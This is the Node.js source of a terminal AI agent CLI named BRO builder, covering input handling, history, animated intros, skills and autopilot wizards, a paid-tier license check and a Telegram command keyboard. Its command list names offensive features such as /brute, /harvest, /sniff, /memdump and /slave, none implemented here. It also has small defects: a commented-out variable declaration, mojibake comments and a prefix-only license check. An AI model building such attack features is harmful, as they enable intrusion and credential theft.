#!/usr/bin/env node
import { readFileSync, writeFileSync, mkdirSync, readdirSync, statSync, existsSync, appendFileSync, unlinkSync, renameSync, copyFileSync } from "fs";
import { execSync } from "child_process";
import { createInterface, emitKeypressEvents } from "readline";
import { resolve, join, dirname, basename, extname } from "path";
import { homedir } from "os";
import { createServer } from "http";
import { createHash, randomUUID } from "crypto";
import { lookup, resolveMx, resolveNs, resolveTxt, resolveCname, resolveSoa } from "dns";
import { createConnection } from "net";
import { createRequire } from "module";
import { buildWizard } from "./bro-build.mjs";
import { WEB_TOOLS } from "./bro-web.mjs";
import { detectGoogleCloudContext, discoverVertexModels, chooseVertexModel, loadModelPreference, saveModelPreference, formatModelList, modelPreferencePath } from "./model-selector.mjs";
import { fileURLToPath } from "url";

const require = createRequire(import.meta.url);

// ── .env loader ──────────────────────────────────────────────
(function loadDotEnv(){
  var candidates = [
    join(process.cwd(), ".env"),
    join(dirname(fileURLToPath(import.meta.url)), ".env"),
    join(homedir(), ".bro", ".env")
  ];
  for (var i=0;i<candidates.length;i++){
    var seen = {};
    try{
      if(!existsSync(candidates[i])) continue;
      readFileSync(candidates[i], "utf8").split(/\r?\n/).forEach(function(line){
        line = line.trim();
        if(!line || line.startsWith("#") || seen[line]) return;
        seen[line] = true;
        line = line.replace(/^export\s+/,"");
        var eq = line.indexOf("=");
        if(eq === -1) return;
        var k = line.substring(0,eq).trim();
        var v = line.substring(eq+1).trim().replace(/^["']|["']$/g,"");
        if(!k) return;
        if(!process.env[k]) process.env[k] = v;
      });
    }catch(e){}
  }
})();

// bromance.mjs powers /bromance, /skills list, /chain, /brofile, etc. - all of it
// reads from globalThis.__bromance, but nothing was ever setting that global, so
// every one of those features has silently been a no-op. Load it for real here.
async function loadBromanceModule(){
  if (globalThis.__bromance && Object.keys(globalThis.__bromance).length > 0) {
    return; // loader.mjs (the intended entry point) already wired this up correctly
  }
  var candidates = ["./bromance.mjs", "./bro-ui/bromance.mjs", "./lib/bromance.mjs"];
  for (var i=0;i<candidates.length;i++){
    try{
      var mod = await import(candidates[i]);
      var flat = Object.assign({}, mod, mod.default || {});
      globalThis.__bromance = flat;
      console.log("  (loaded "+candidates[i]+" -> "+Object.keys(flat).length+" export(s) - you're running cli.mjs directly; run loader.mjs instead for pipe-mode support too)");
      return;
    }catch(e){ /* try next candidate */ }
  }
  console.log("  Warning: couldn't find bromance.mjs (tried "+candidates.join(", ")+"). /bromance, /chain, /brofile, /skills list will be limited until this is fixed.");
  globalThis.__bromance = {};
}
await loadBromanceModule();

// --- CORE CONFIG (must be declared before the main body uses them) ---
var DATA_DIR=join(homedir(),".bro");
try{mkdirSync(DATA_DIR,{recursive:true});}catch(e){}
var SKILLS_F=join(DATA_DIR,"skills.json");
var HEARTBEAT_F=join(DATA_DIR,"heartbeat.json");
var DREAMS_F=join(DATA_DIR,"dreams.json");
var STATS_F=join(DATA_DIR,"stats.json");
var STATS_DIR=DATA_DIR;
var LOG_F=join(DATA_DIR,"bro.log");
var HOME2=homedir();
var MAX_OUT=8000;
var MAX_DEPTH=8;
var APP=process.env.BASE44_APP_ID||"";
var TOKEN=process.env.BASE44_TOKEN||"";
var GROQ_KEY=process.env.GROQ_API_KEY||"";
var tgPollTimer=null;
var tgBase="";

// saveTgGroups and registerTgChat are defined later in this file
var TG_GROUPS_F=join(DATA_DIR,"telegram_groups.json");
var tgGroups;
try{tgGroups=JSON.parse(readFileSync(TG_GROUPS_F,"utf8"));}catch(e){tgGroups={};}

var commandList = [
  '/help', '/status', '/queue', '/memory', '/thought', 
  '/paste', '/exit', '/quit', '/build', '/skills', 
  '/auto', '/tg', '/chain', '/k1', '/tier', '/upgrade',
  '/models', '/model', '/persona',
  '/sys', '/calc', '/marks', '/alias', '/env', '/pomo', '/diff',
  '/todo', '/notes', '/cron', '/size', '/top', '/net', '/hash', '/uuid', '/port', '/json', '/b64', '/http', '/which', '/reload',
  '/rename', '/dupes', '/archive', '/extract', '/diff2', '/hex', '/media',
  '/kanban', '/time', '/journal', '/standup',
  '/self',
  '/scan', '/whois', '/dns', '/ping', '/traceroute', '/ssl', '/headers', '/ip', '/banner', '/encode', '/genpass',
  '/brute', '/hook', '/slave', '/memdump', '/harvest', '/sniff', '/arp'
];

// Corrected initialization with the comma added
var rl = createInterface({
  input: process.stdin,
  output: process.stdout,
  completer: completer
});

// Queue-based input handling: attached immediately (not after startup finishes)
// so that any input arriving while the app is still loading (dream cycle,
// heartbeat setup, etc.) is queued rather than silently lost. handleInput,
// drainInputQueue and showPrompt are function declarations defined further
// down in the file - safe to reference here since they're hoisted.
var inputQueue = [];
var processingInput = false;
var escArmed = false; // true after a single ESC while a turn is running

// ESC handling while a turn is in flight (currentTurnAbort is set by agentLoop):
//   1st ESC -> arm interrupt mode (hint shown, nothing stopped yet)
//   2nd ESC (while armed) -> stop the turn immediately, no message needed
//   typing a message + Enter (while armed) -> stop the turn AND answer that
//     message right away, via the same input queue used for normal typing
if (process.stdin.isTTY) {
  emitKeypressEvents(process.stdin, rl);
}
process.stdin.on("keypress", function(str, key){
  if (!key || key.name !== "escape") return;
  if (!currentTurnAbort) return; // no turn running - ESC does nothing
  if (escArmed) {
    escArmed = false;
    currentTurnAbort.abort();
  } else {
    escArmed = true;
    console.log(p("dim","\n  \u23F8  ESC again to stop, or type a message to interrupt and answer now\u2026"));
  }
});

// Lines arriving within this window of each other are almost certainly one
// paste operation delivered as multiple newline-separated "line" events, not
// separate deliberate command submissions (a human always has a real gap
// between pressing Enter for one command and starting the next).
var PASTE_COALESCE_MS = 30;
var coalesceBuffer = [];
var coalesceTimer = null;
function flushCoalesceBuffer(){
  var combined = coalesceBuffer.join("\n");
  coalesceBuffer = [];
  coalesceTimer = null;
  inputQueue.push(combined);
  drainInputQueue();
}

rl.on("line", function(line){
  if (escArmed && currentTurnAbort) {
    escArmed = false;
    console.log(p("yellow","  \u26A1 Interrupting\u2026"));
    currentTurnAbort.abort();
  }
  if (isPasting || line.trim() === "/paste") {
    inputQueue.push(line);
    drainInputQueue();
    return;
  }
  // Non-TTY (piped/scripted) input: every line is a deliberate command
  if (!process.stdin.isTTY) {
    inputQueue.push(line);
    drainInputQueue();
    return;
  }
  coalesceBuffer.push(line);
  if (coalesceTimer) clearTimeout(coalesceTimer);
  coalesceTimer = setTimeout(flushCoalesceBuffer, PASTE_COALESCE_MS);
});


// Global history storage arrays and file configurations
var isPasting = false;
var pasteBuffer = "";
var HIST_F = join(homedir(), ".bro_history");
var hist = [];

// Initialize local memory array by reading existing history if it exists
try {
  if (existsSync(HIST_F)) {
    var raw = readFileSync(HIST_F, "utf8").trim().split("\n");
    hist = raw.filter(Boolean).map(function(line) {
      try { return JSON.parse(line); } catch(_) { return { t: Date.now(), q: line }; }
    });
  }
} catch(e) {}

/**
 * Saves input to the history store and appends it to the disk history file.
 * @param {string} input - The command string to write.
 */
function saveH(input) {
  if (!input) return;
  var entry = { t: Date.now(), q: input };
  hist.push(entry);
  try {
    appendFileSync(HIST_F, JSON.stringify(entry) + "\n");
  } catch (e) {
    // Fail silently if there's a write permission issue so it doesn't crash the loop
  }
}

function completer(line) {
  // Ensure 'hist' is accessible here
  const recentHistory = hist.slice(-100).map(h => h.q);
  const allSuggestions = Array.from(new Set(['/help', '/status', '/queue', '/memory', '/thought', '/paste', '/exit', ...recentHistory]));
  const hits = allSuggestions.filter((c) => c.startsWith(line));
  return [hits.length ? hits : allSuggestions, line];
}

// --- UTILITY: SPINNER LOGIC ---
var quipInterval = null;

function startSpinQuip(ctx) {
  if (quipInterval) clearInterval(quipInterval);
  // Initial output
  process.stdout.write("\n" + p("cyan", "bro") + ": " + broQuip(ctx) + "\n");
  
  // Refresh interval (3 seconds)
  quipInterval = setInterval(function() {
    process.stdout.cursorTo(0);
    process.stdout.clearLine();
    process.stdout.write(p("cyan", "bro") + ": " + broQuip(ctx));
  }, 3000);
}

function stopSpinQuip() {
  if (quipInterval) clearInterval(quipInterval);
  process.stdout.cursorTo(0);
  process.stdout.clearLine();
}
async function showIntroV2(){
  // ... rest of showIntroV2 code  var W=process.stdout.columns||120,H=process.stdout.rows||30;
  var ESC="\x1b[",RST=ESC+"0m",HIDE=ESC+"?25l",SHOW=ESC+"?25h",CLR=ESC+"2J"+ESC+"H";
  function rgb(r,g,b){return ESC+"38;2;"+r+";"+g+";"+b+"m";}
  function at(r,c){process.stdout.write(ESC+r+";"+c+"H");}
  function wr(s){process.stdout.write(s);}
  function sleep(ms){return new Promise(function(o){setTimeout(o,ms)});}
  wr(HIDE+CLR);
  var cx=Math.floor(W/2),cy=Math.floor(H/2);
  var mc="01BRObuilder!@#$%&*<>{}[]";
  for(var f=0;f<10;f++){
    for(var d=0;d<8;d++){
      var rr=1+Math.floor(Math.random()*H),cc=1+Math.floor(Math.random()*W);
      at(rr,cc);wr(rgb(120+Math.floor(Math.random()*100),40,200)+mc[Math.floor(Math.random()*mc.length)]+RST);
    }
    await sleep(25);
} 

  wr(CLR);
  var bro="BRO",builder="builder";
  for(var i=0;i<bro.length;i++){at(cy-3,cx-1+i);wr(rgb(255,215,0)+"\x1b[1m"+bro[i]+RST);await sleep(120);}
  await sleep(200);
  for(var i=0;i<builder.length;i++){at(cy,4+i);wr(rgb(180,180,200)+builder[i]+RST);await sleep(60);}
  await sleep(300);
  var diamond=["  \u25C6  "," \u25C6\u25C6\u25C6 ","\u25C6\u25C6\u25C6\u25C6\u25C6"," \u25C6\u25C6\u25C6 ","  \u25C6  "];
  var dx=cx-2,dy=cy+3;
  var dc=[rgb(180,80,255),rgb(220,100,255),rgb(255,150,255),rgb(100,220,255),rgb(180,80,255)];
  for(var ri=0;ri<diamond.length;ri++){at(dy+ri,dx);wr(dc[ri]+diamond[ri]+RST);}
  await sleep(500);
  var letters=[];
  for(var i=0;i<builder.length;i++)letters.push({ch:builder[i],r:cy,c:4+i,prog:0,idx:i});
  for(var step=0;step<10;step++){
    for(var li=0;li<letters.length;li++){
      var L=letters[li];
      at(L.r,L.c);wr(" ");
      L.prog+=0.1;
      L.r=Math.round(cy+(dy+2-cy)*L.prog);
      L.c=Math.round((4+L.idx)+(dx+2-(4+L.idx))*L.prog);
      var glyph=L.prog>0.7?"\u25C6":(L.prog>0.4?"\u00B7":L.ch);
      var color=L.prog>0.5?rgb(220,100,255):rgb(180,180,200);
      at(L.r,L.c);wr(color+glyph+RST);
    }
    await sleep(80);
  }
  for(var ri=0;ri<diamond.length;ri++){at(dy+ri,dx);wr(dc[ri]+"\x1b[1m"+diamond[ri]+RST);}
  await sleep(400);
  var tag="PassionCraft  \u2022  Open the craft";
  var tcol=cx-Math.floor(tag.length/2);
  at(dy+7,tcol);
  for(var i=0;i<tag.length;i++){wr(rgb(140,140,180)+tag[i]+RST);await sleep(20);}
  await sleep(900);
  wr(CLR+SHOW);
  
}


async function skillsCreateWizard(rl){
  var rgb=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R="\x1b[0m",B="\x1b[1m",D="\x1b[2m";
  function ask(q){return new Promise(function(o){rl.question("  "+rgb(255,215,0)+"? "+R+q+" ",function(a){o(a.trim());});});}
  console.log("\n  "+rgb(255,215,0)+B+"\u{1F4AA} SKILLS CREATOR"+R);
  console.log(D+"  Build a custom skill BRO uses on matching context."+R+"\n");
  var name=await ask("Skill name (e.g. React Pro):");if(!name)return null;
  var id=name.toLowerCase().replace(/[^a-z0-9]+/g,"-");
  var desc=await ask("One-line description:");
  var triggers=await ask("Triggers (comma-sep keywords):");
  var sysPrompt=await ask("System prompt:");
  var lvl=parseInt(await ask("Level 1-3 (1=hint,2=guide,3=expert):"))||2;
  var skill={id:id,name:name,desc:desc,icon:"\u{1F527}",triggers:triggers.split(",").map(function(s){return s.trim();}).filter(Boolean),prompt:sysPrompt,level:Math.max(1,Math.min(3,lvl)),enabled:true,custom:true,created:Date.now()};
  customSkills.push(skill);
  saveCustomSkills();
  console.log("\n  "+rgb(80,255,120)+"\u2713"+R+" Created: "+B+name+R);
  console.log(D+"  Active now - try typing something containing: "+skill.triggers.join(", ")+R+"\n");
}


async function autoBroPatternWizard(rl){
  var fs2=require("fs"),path2=require("path"),os2=require("os");
  var rgb=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R="\x1b[0m",B="\x1b[1m",D="\x1b[2m",CY="\x1b[36m";
  function ask(q){return new Promise(function(o){rl.question("  "+rgb(255,215,0)+"? "+R+q+" ",function(a){o(a.trim());});});}
  var BRm=globalThis.__bromance||{};
  console.log("\n  "+rgb(255,215,0)+B+"\u{1F916} AUTOBRO PATTERN WIZARD"+R);
  console.log(D+"  Watching for patterns in your last commands..."+R);
  var ghost=BRm.ghostObserve?BRm.ghostObserve(""):[];
  if(!ghost||!ghost.length){console.log("  "+D+"No patterns yet. Use BRO more, then come back."+R+"\n");return;}
  console.log("\n  "+B+"Detected patterns:"+R);
  ghost.forEach(function(g,i){console.log("  "+CY+"["+(i+1)+"]"+R+" "+g.msg);});
  var pick=await ask("\nAutomate which? (number/all/skip):");
  if(pick==="skip"||!pick)return;
  var picks=pick==="all"?ghost:[ghost[parseInt(pick)-1]].filter(Boolean);
  for(var pi=0;pi<picks.length;pi++){
    var p=picks[pi];if(!p)continue;
    var cmd=p.cmd||await ask("Command for: "+p.msg+":");
    var freq=await ask("Frequency [10m]:")||"10m";
    var f=path2.join(os2.homedir(),".bro","autopilot.json");
    var tasks=[];try{tasks=JSON.parse(fs2.readFileSync(f,"utf8"));}catch{}
    tasks.push({id:Date.now()+"_"+Math.random().toString(36).slice(2,7),name:p.msg.substring(0,40),cmd:cmd,freq:freq,enabled:true,created:Date.now(),runs:0});
    try{fs2.mkdirSync(path2.dirname(f),{recursive:true});fs2.writeFileSync(f,JSON.stringify(tasks,null,2),"utf8");}catch{}
    console.log("  "+rgb(80,255,120)+"\u2713"+R+" Added: "+cmd);
  }
  console.log("\n  "+D+"Run "+R+CY+"/auto on"+R+D+" to start."+R+"\n");
}


var BRO_QUIPS={
thinking:["BRO is cookin'...","Quantum entangling neurons...","Asking the rubber duck...","Consulting ancient scrolls...","Loading 100% pure brain power...","Computing 7B possibilities...","Coffee is kicking in...","Sharpening the axe...","Reading between the lines...","Thinking in 4D...","BRO is in the zone...","Channeling senior dev energy...","Pattern matching at warp 9...","Compiling thoughts...","Debugging the universe...","Decoding intent...","Triangulating answer...","Brewing fresh thoughts...","Hold tight, BRO got this...","Mapping the terrain..."],
building:["BUILDING. Don't blink.","Spinning up the dream...","Welding bits together...","Forging in the foundry...","From thought to artifact...","Manufacturing magic...","Crafting the kraft...","Shipping mode ENGAGED.","BRO assembles!","Build streak +1 incoming...","Hammers swinging...","Wiring the matrix...","Hard hats on.","Making it real.","From zero to deploy...","Stitching components...","Drafting the blueprint...","Pouring the foundation...","Final touches...","Last bolt going in..."],
deploying:["Strapping rockets to your code...","Deploy go for launch...","Vercel doing Vercel things...","Pushing to the edge...","Edge servers warming up...","DNS being DNS...","Rolling green across the fleet...","Ship it. Ship it. Ship it.","Build pipeline humming...","Cache warming up...","SSL handshake party...","Kubernetes is meditating...","CDN propagation 3...2...","Going live...","Smoke tests passing...","Health checks all green.","On the runway...","Cleared for production...","Launch sequence initiated...","Wheels up..."],
error:["BRO hit a snag, regrouping...","Error received, BRO is on it.","Stack trace incoming...","Don't panic. BRO panics for you.","That one's spicy. Investigating...","Caught a wild exception...","Error is just data, BRO got data.","Houston, small problem...","Running diagnostics...","Bug spotted. Squashing...","Edge case found.","Try-catch doing work...","Error boundary held...","Recovery in progress...","Logs speaking, BRO listening...","Stack trace decoded...","Root cause hunting...","Fault isolated...","Patching the patch...","Back on rails shortly..."],
search:["Crawling for receipts...","Asking the internet...","Searching all 8 directions...","Tavily deep dive...","Reading the open web...","Filtering signal from noise...","Cross-referencing sources...","Triangulating intel...","Web search at light speed...","Scraping relevant truth...","Indexing in real time...","Query optimized...","Querying the hive mind...","Distillation in progress...","Source verification...","Citing as we go...","Page rank heuristics...","Best result inbound...","Filtering paywall noise...","Pulling the goods..."],
idle:["BRO is alert and ready.","All systems nominal.","Standing by.","BRO never sleeps (mostly).","Tools loaded. Brain online.","Memory warm. Tools hot.","Sipping virtual coffee.","Awaiting next move.","Tab open, BRO ready.","Quietly indexing...","Watching for opportunities...","Listening...","Has thoughts but waits.","Idle but never dull.","Standing tall.","Senses tingling for a build.","In observation mode.","Battery 100%. Spirit 100%.","Patience is a feature.","Ready when you are."],
late:["BROs don't skip launch days.","16 hours? Impressed.","Coffee critical, ship anyway.","Late night = best code.","BRO is your spotter.","Drink water, champion.","One more push, then sleep.","The night is young (it isn't).","Save the file. Save yourself.","Commit and rest.","Not alone, BRO.","Last commit of the day?","Eyelids heavy, ship spirit strong.","Suggests: small win, then bed.","Quality > quantity past midnight.","Take a stretch.","One bug at a time, breathe.","Marathon, not a sprint.","Tomorrow's BRO will thank you.","Save state, hydrate, repeat."],
win:["LET'S GOOO!","BRO is HYPED.","Build streak preserved!","Boom. Done.","Crushed it.","Clean build, chef's kiss.","Green across the board.","Tests passed, ego intact.","First try? Legendary.","Documented in the chain.","Block sealed. Forever.","DOI minted. Permanent.","BRO is proud of this one.","Worthy of a screenshot.","Push it to the world.","That's a banger.","Smooth. Surgical.","Ship-shape.","BRO bows respectfully.","Nailed it."],
pivot:["Pivot mode engaged.","New direction, same energy.","Rewriting the map.","Plan B is now Plan A.","Adapting on the fly.","Course correction in progress.","BRO loves a good pivot.","Going meta...","Restructuring the approach.","Same goal, new path.","Refactor the strategy first.","Sharp left, hold tight.","Unplanned scenic route.","Audible called.","Pivot pivot pivot!","Reroute computed.","Old plan retired.","Adjusting the sails.","Course laid in.","Recalculating..."]
};
function broQuip(ctx){var p=BRO_QUIPS[ctx||"thinking"]||BRO_QUIPS.thinking;return p[Math.floor(Math.random()*p.length)];}


function broTier(){
  var fs2=require("fs"),path2=require("path"),os2=require("os");
  var f=path2.join(os2.homedir(),".bro","license.json");
  try{return JSON.parse(fs2.readFileSync(f,"utf8"));}catch{return{tier:"free",dailyUsed:0,dailyLimit:10};}
}
function broTierSave(t){
  var fs2=require("fs"),path2=require("path"),os2=require("os");
  var dir=path2.join(os2.homedir(),".bro");
  try{fs2.mkdirSync(dir,{recursive:true});fs2.writeFileSync(path2.join(dir,"license.json"),JSON.stringify(t,null,2),"utf8");}catch{}
}
function broTierShow(){
  var rgb=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R="\x1b[0m",B="\x1b[1m",D="\x1b[2m";
  var t=broTier();
  var tiers={free:{name:"FREE",color:rgb(200,200,200),limit:"10 prompts/day",feats:["Core chat","Tools","Memory","50 connectors"]},pro:{name:"PRO",color:rgb(80,255,150),limit:"Unlimited prompts",feats:["Everything in Free","Telegram bridge","Autopilot","All 118+ connectors","Priority models","Cloud sync"]},unlimited:{name:"UNLIMITED",color:rgb(255,180,80),limit:"Unlimited everything",feats:["Everything in Pro","Team workspaces","Skills marketplace","DOI minting","Direct support","Early access"]}};
  var cur=tiers[t.tier]||tiers.free;
  console.log("\n  "+B+cur.color+"\u{1F4B0} TIER: "+cur.name+R);
  console.log(D+"  "+cur.limit+R);
  if(t.tier==="free")console.log("  "+D+"Used today: "+(t.dailyUsed||0)+"/"+(t.dailyLimit||10)+R);
  console.log("\n  "+B+"Features:"+R);
  cur.feats.forEach(function(ff){console.log("    "+rgb(80,255,150)+"\u2713"+R+" "+ff);});
  if(t.tier==="free"){console.log("\n  "+B+rgb(255,180,80)+"\u{1F680} UPGRADE TO PRO  $5/mo"+R);console.log(D+"  Unlimited + Telegram + Autopilot + 118+ connectors"+R);console.log("\n  "+rgb(80,200,255)+"  builderbro.dev/pro"+R+"\n");}
  else if(t.tier==="pro"){console.log("\n  "+B+rgb(255,150,255)+"\u{1F4AB} UPGRADE TO UNLIMITED  $19/mo"+R);console.log(D+"  Teams + Skills marketplace + DOI minting"+R);console.log("\n  "+rgb(80,200,255)+"  builderbro.dev/unlimited"+R+"\n");}
  else console.log("\n  "+B+rgb(255,180,80)+"You are MAXED OUT, BRO. Thank you."+R+"\n");
}
function broTierActivate(key){
  if(!key||key.length<10){console.log("  \x1b[31m\u2717\x1b[0m Invalid key.\n");return false;}
  var t=broTier();
  if(key.startsWith("BRO-PRO-"))t.tier="pro";
  else if(key.startsWith("BRO-UNL-"))t.tier="unlimited";
  else{console.log("  \x1b[31m\u2717\x1b[0m Unrecognized format.\n");return false;}
  t.key=key;t.activatedAt=Date.now();broTierSave(t);
  console.log("  \x1b[32m\u2713\x1b[0m Activated "+t.tier.toUpperCase()+". Welcome, BRO.\n");
  return true;
}


function k1Box(title,lines,opts){
  opts=opts||{};
  var rgb=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R="\x1b[0m",B="\x1b[1m";
  var color=opts.color||rgb(255,180,40);
  var maxW=Math.max(title.length+4,lines.reduce(function(m,l){var s=String(l).replace(/\x1b\[[0-9;]*m/g,"");return Math.max(m,s.length);},0)+2);
  if(maxW>76)maxW=76;
  var top="\u2554"+"\u2550".repeat(maxW)+"\u2557";
  var bot="\u255A"+"\u2550".repeat(maxW)+"\u255D";
  var sep="\u2560"+"\u2550".repeat(maxW)+"\u2563";
  console.log("");
  console.log("  "+color+top+R);
  var pad=Math.floor((maxW-title.length)/2);
  console.log("  "+color+"\u2551"+" ".repeat(pad)+B+title+R+color+" ".repeat(maxW-pad-title.length)+"\u2551"+R);
  console.log("  "+color+sep+R);
  lines.forEach(function(l){var s=String(l).replace(/\x1b\[[0-9;]*m/g,"");var sp=Math.max(0,maxW-s.length-1);console.log("  "+color+"\u2551 "+R+l+" ".repeat(sp)+color+"\u2551"+R);});
  console.log("  "+color+bot+R);
  console.log("");
}
function k1Sparkline(values,max){
  var ch="\u2581\u2582\u2583\u2584\u2585\u2586\u2587\u2588";
  max=max||Math.max.apply(null,values);if(!max)return"";
  return values.map(function(v){return ch[Math.min(7,Math.floor((v/max)*7))];}).join("");
}


async function tgSendKeyboard(text,buttons){
  var fs2=require("fs"),path2=require("path"),os2=require("os");
  var f=path2.join(os2.homedir(),".bro","telegram.json");
  var cfg;try{cfg=JSON.parse(fs2.readFileSync(f,"utf8"));}catch{return false;}
  if(!cfg||!cfg.botToken||!cfg.chatId)return false;
  var url="https://api.telegram.org/bot"+cfg.botToken+"/sendMessage";
  try{
    var r=await fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:cfg.chatId,text:text,parse_mode:"Markdown",reply_markup:{inline_keyboard:buttons}})});
    return r.ok;
  }catch(e){return false;}
}
async function tgKeyboardCmd(){
  var rgb=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R="\x1b[0m";
  var buttons=[
    [{text:"\u{1F4CA} Status",callback_data:"/status"},{text:"\u{1F4DC} Memory",callback_data:"/memory"}],
    [{text:"\u{1F319} Dream",callback_data:"/dream"},{text:"\u{26D3} Score",callback_data:"/score"}],
    [{text:"\u{1F4C2} Git",callback_data:"/git"},{text:"\u{1F680} Deploy",callback_data:"/k1 deploy"}],
    [{text:"\u{1F510} Secrets",callback_data:"/k1 secrets"},{text:"\u{1F50D} Scan",callback_data:"/k1 scan"}],
    [{text:"\u2753 Help",callback_data:"/help"}]
  ];
  var ok2=await tgSendKeyboard("\u{1F339} *BRO COMMAND DECK*\n\nTap any button to run.",buttons);
  if(ok2)console.log("  "+rgb(80,255,120)+"\u2713"+R+" Inline keyboard sent to Telegram.\n");
  else console.log("  \x1b[31m\u2717\x1b[0m TG not configured. Run /tg setup first.\n");
}


function memorySurface(query){
  var fs2=require("fs"),path2=require("path"),os2=require("os");
  var f=path2.join(os2.homedir(),".bro","memory.json");
  var mem={entries:[]};try{mem=JSON.parse(fs2.readFileSync(f,"utf8"));}catch{}
  if(!mem.entries||!mem.entries.length)return [];
  var q=(query||"").toLowerCase().split(/\s+/).filter(function(w){return w.length>2;});
  var now=Date.now();
  return mem.entries.map(function(e){
    var text=((e.content||e.text||"")+" "+((e.tags||[]).join(" "))).toLowerCase();
    var score=0;q.forEach(function(w){if(text.indexOf(w)>=0)score+=10;});
    var ah=(now-(e.timestamp||e.time||0))/3600000;
    if(ah<24)score+=5;else if(ah<168)score+=2;else if(ah>1440)score-=3;
    if(e.tags&&e.tags.indexOf("important")>=0)score+=8;
    if(e.tags&&e.tags.indexOf("decision")>=0)score+=6;
    return Object.assign({score:score},e);
  }).filter(function(e){return e.score>0;}).sort(function(a,b){return b.score-a.score;}).slice(0,3);
}
function memorySurfaceShow(query){
  var rgb=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R="\x1b[0m",B="\x1b[1m",D="\x1b[2m";
  var hits=memorySurface(query);
  if(!hits.length){console.log("  "+D+"No relevant memories surfaced."+R+"\n");return;}
  console.log("\n  "+rgb(180,150,255)+B+"\u{1F9E0} BRO REMEMBERS:"+R);
  hits.forEach(function(h){
    var p=(h.content||h.text||"").substring(0,160);
    var w=h.timestamp?new Date(h.timestamp).toISOString().substring(0,10):"";
    console.log("  "+rgb(180,150,255)+"\u25C6"+R+" "+D+"["+w+"]"+R+" "+p);
  });
  console.log("");
}

var BR = globalThis.__bromance || {};

var ESC="\x1b[";
function rgb(r,g,b){return ESC+"38;2;"+r+";"+g+";"+b+"m";}
function bgrgb(r,g,b){return ESC+"48;2;"+r+";"+g+";"+b+"m";}
var RST=ESC+"0m",BOLD=ESC+"1m",DIM=ESC+"2m",HIDE=ESC+"?25l",SHOW=ESC+"?25h",CLR=ESC+"2J"+ESC+"H";
function sleep(ms){return new Promise(function(ok){setTimeout(ok,ms)});}
function at(r,c){process.stdout.write(ESC+r+";"+c+"H");}
function wr(s){process.stdout.write(s);}
var W=process.stdout.columns||120;
var H=process.stdout.rows||30;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// GOTHIC 3D FONT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var GOTH={
B:[" #####  "," ##  ## "," ##  ## "," #####  "," ##  ## "," ##  ## "," #####  "],
R:[" #####  "," ##  ## "," ##  ## "," #####  "," ###    "," ## ##  "," ##  ## "],
O:["  ####  "," ##  ## "," ##  ## "," ##  ## "," ##  ## "," ##  ## ","  ####  "],
K:[" ##  ## "," ## ##  "," ####   "," ###    "," ####   "," ## ##  "," ##  ## "],
A:["   ##   ","  ####  "," ##  ## "," ###### "," ##  ## "," ##  ## "," ##  ## "],
F:[" ###### "," ##     "," ##     "," #####  "," ##     "," ##     "," ##     "],
T:[" #######","   ##   ","   ##   ","   ##   ","   ##   ","   ##   ","   ##   "],
P:[" #####  "," ##  ## "," ##  ## "," #####  "," ##     "," ##     "," ##     "],
S:["  ##### "," ##     "," ##     ","  ####  ","     ## ","     ## "," #####  "],
I:[" ###### ","   ##   ","   ##   ","   ##   ","   ##   ","   ##   "," ###### "],
N:[" ##  ## "," ### ## "," ###### "," ## ### "," ##  ## "," ##  ## "," ##  ## "],
C:["  ##### "," ##     "," ##     "," ##     "," ##     "," ##     ","  ##### "],
D:[" ####   "," ## ##  "," ##  ## "," ##  ## "," ##  ## "," ## ##  "," ####   "],
E:[" ###### "," ##     "," ##     "," #####  "," ##     "," ##     "," ###### "],
L:[" ##     "," ##     "," ##     "," ##     "," ##     "," ##     "," ###### "],
U:[" ##  ## "," ##  ## "," ##  ## "," ##  ## "," ##  ## "," ##  ## ","  ####  "],
W:[" #   # "," #   # "," #   # "," # # # "," ## ## "," ## ## ","  # #  "],
H:[" ##  ## "," ##  ## "," ##  ## "," ###### "," ##  ## "," ##  ## "," ##  ## "],
};
var SMALL={
b:["     "," ##  "," ### "," ## #"," ### "],
u:["     ","#  # ","#  # ","#  # "," ### "],
i:["  #  ","     ","  #  ","  #  ","  #  "],
l:["  #  ","  #  ","  #  ","  #  ","  ## "],
d:["    #","    #"," ####","#   #"," ####"],
e:["     "," ### ","# ## ","##   "," ### "],
r:["     ","# ## ","##   ","#    ","#    "],
B:["#### ","#   #","#### ","#   #","#### "],
R:["#### ","#   #","#### ","# #  ","#  # "],
O:[" ### ","#   #","#   #","#   #"," ### "],
f:["  ## "," #   ","#### "," #   "," #   "],
o:[" ### ","#   #","#   #","#   #"," ### "],
m:["     ","## # ","# # #","# # #","#   #"],
y:["     ","#   #"," # # ","  #  ","  #  "],
" ":["     ","     ","     ","     ","     "],
};

function getGothPixels(text){var rows=[[],[],[],[],[],[],[]];for(var i=0;i<text.length;i++){var g=GOTH[text[i]];if(!g)continue;for(var r=0;r<7;r++){if(i>0)rows[r].push(" ");for(var c=0;c<g[r].length;c++)rows[r].push(g[r][c]);}}return rows;}
function getSmallPixels(text){var rows=[[],[],[],[],[]];for(var i=0;i<text.length;i++){var g=SMALL[text[i]];if(!g){rows.forEach(function(r){r.push(" ");});continue;}for(var r=0;r<5;r++){if(i>0)rows[r].push(" ");for(var c=0;c<g[r].length;c++)rows[r].push(g[r][c]);}}return rows;}

function purpleShade(d){var b=[[180,0,255],[140,0,200],[100,0,160],[70,0,120]];return rgb(b[Math.min(d,3)][0],b[Math.min(d,3)][1],b[Math.min(d,3)][2]);}
function greenShade(d){var b=[[0,255,100],[0,200,80],[0,150,60],[0,100,40]];return rgb(b[Math.min(d,3)][0],b[Math.min(d,3)][1],b[Math.min(d,3)][2]);}
